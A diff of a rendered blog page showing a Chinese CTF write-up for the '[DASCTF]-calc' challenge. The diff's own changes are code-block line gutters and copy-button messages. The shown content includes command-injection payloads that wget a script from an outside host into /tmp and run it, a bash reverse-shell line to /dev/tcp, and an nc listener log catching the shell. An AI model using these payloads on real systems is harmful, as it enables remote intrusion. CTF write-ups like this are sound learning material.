@@ -460,7 +460,7 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="DASCTF-calc"><a href="#DASCTF-calc" class="headerlink" title="[DASCTF]-calc"></a>[DASCTF]-calc</h1><p>打开来是个计算器，没猜错应该要RCE</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="shiki python"><div class='codeblock'><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#coding=utf-8</span></span>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#coding=utf-8</span></span>
 <span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> flask </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span></span>
 <span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> random</span></span>
 <span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> urllib </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> parse</span></span>
@@ -508,14 +508,14 @@
 <h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>由于过滤了很多字符，且命令并无回显，所以这里用<code>wget</code>下载反弹shell的<code>sh</code>文件，然后运行</p>
 <p>空格用%09绕过就好，也可以用<code>&gt;</code>等等，不多赘述</p>
 <p>上传一个这样的shell文件到一个网站上</p>
-<figure class="shiki shell"><div class='codeblock'><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">bash</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> &gt;&amp; </span><span style="color: #98C379">/dev/tcp/{IP}/{PORT}</span><span style="color: #ABB2BF"> 0&gt;&amp;1</span></span></code></pre></div></div></figure>
+<figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">bash</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> &gt;&amp; </span><span style="color: #98C379">/dev/tcp/{IP}/{PORT}</span><span style="color: #ABB2BF"> 0&gt;&amp;1</span></span></code></pre></div></div></figure>
 
 <p>让目标机器保存在<code>/tmp</code>下，然后执行</p>
-<figure class="shiki"><div class='codeblock'><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`</span></span>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`</span></span>
 <span class="line"><span style="color: #abb2bf">num=7*7%23`sh%09/tmp/bsh.sh`</span></span></code></pre></div></div></figure>
 
 <p>攻击机监听对应端口，getshell</p>
-<figure class="shiki bash"><div class='codeblock'><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[root@ecs-394098 ~]# nc -lvnp 4444</span></span>
+<figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[root@ecs-394098 ~]# nc -lvnp 4444</span></span>
 <span class="line"><span style="color: #61AFEF">Ncat:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Connection</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">from</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">117.21</span><span style="color: #98C379">.200.166.</span></span>
 <span class="line"><span style="color: #61AFEF">Ncat:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Connection</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">from</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">117.21</span><span style="color: #98C379">.200.166:62378.</span></span>
 <span class="line"><span style="color: #61AFEF">bash:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cannot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">terminal</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">process</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">group</span><span style="color: #ABB2BF"> (1): Inappropriate ioctl </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> device</span></span>
@@ -912,15 +912,15 @@
 <!-- hexo injector body_end start -->
   <script>
   const CODE_CONFIG = {
-    beautify: undefined,
-    highlightCopy: undefined,
-    highlightLang: undefined,
+    beautify: false,
+    highlightCopy: true,
+    highlightLang: false,
     highlightHeightLimit: undefined,
     isHighlightShrink: undefined,
     copy: {
-      success: 'undefined',
-      error: 'undefined',
-      noSupport: 'undefined',
+      success: '看来我的内容帮到你了，祝你今天愉快！',
+      error: '啊哦，复制失败了~',
+      noSupport: '浏览器不支持欸',
     }
   };
   console.log(
